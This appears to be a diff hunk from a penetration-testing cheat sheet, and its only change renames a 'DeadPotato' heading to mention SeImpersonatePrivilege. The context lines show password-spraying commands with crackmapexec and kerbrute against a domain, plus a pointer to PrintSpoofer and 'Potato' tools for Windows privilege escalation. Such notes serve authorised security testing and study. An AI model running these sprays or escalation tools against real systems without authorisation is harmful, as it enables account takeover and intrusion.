@@ -1890,7 +1890,7 @@ crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on
 # Kerbrute
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
-### DeadPotato
+### DeadPotato SeImpersonatePrivilege
 - For SeImpersonatePrivilege try PrintSpoofer, Different Potatos
 - In Powershell or cmd
 
